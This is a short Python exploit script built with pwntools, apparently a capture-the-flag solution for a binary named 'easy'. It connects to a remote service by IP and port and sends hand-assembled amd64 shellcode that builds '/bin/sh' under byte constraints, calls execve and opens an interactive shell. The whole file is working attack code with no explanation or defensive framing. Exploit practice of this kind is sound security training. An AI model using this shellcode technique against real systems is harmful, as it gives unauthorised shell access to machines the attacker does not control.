from pwn import *

#r = process('./easy')
r = remote('52.69.40.204',8361)
context.arch = 'amd64'

payload = ''
payload += asm('mov rdi, 0x68732f6e69622e') #
payload += asm('xor di, 1')                 # to avoid double /
payload += asm('push rdi')
payload += asm('push rsp')                  #
payload += asm('pop rdi')                   # to avoid duplicates
payload += asm('mov al, 0x3b')
payload += asm('syscall')

r.send(payload)

r.interactive()
